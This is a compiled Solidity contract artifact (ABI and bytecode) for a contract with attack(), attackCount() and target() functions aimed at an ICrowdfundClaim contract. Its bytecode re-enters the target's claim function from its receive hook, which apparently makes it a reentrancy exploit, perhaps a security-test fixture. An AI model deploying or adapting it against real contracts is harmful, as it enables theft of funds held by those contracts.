{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ICrowdfundClaim"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b50604051610492380380610492833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61037b806101176000396000f3fe6080604052600436106100385760003560e01c8063407c2821146100e75780639e5faafc14610112578063d4b8399214610129576100e2565b366100e2576001805410156100e0576001600081548092919061005a90610239565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100c757600080fd5b505af11580156100db573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100f357600080fd5b506100fc610154565b6040516101099190610290565b60405180910390f35b34801561011e57600080fd5b5061012761015a565b005b34801561013557600080fd5b5061013e6101dc565b60405161014b919061032a565b60405180910390f35b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101c257600080fd5b505af11580156101d6573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006102448261022f565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361027657610275610200565b5b600182019050919050565b61028a8161022f565b82525050565b60006020820190506102a56000830184610281565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102f06102eb6102e6846102ab565b6102cb565b6102ab565b9050919050565b6000610302826102d5565b9050919050565b6000610314826102f7565b9050919050565b61032481610309565b82525050565b600060208201905061033f600083018461031b565b9291505056fea26469706673582212205fc3b3266ce924a8dcfeb912d4441f2d82b5776e17338f93f25953bd580c826564736f6c63430008110033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attackCount()":"407c2821","target()":"d4b83992"},"id":41}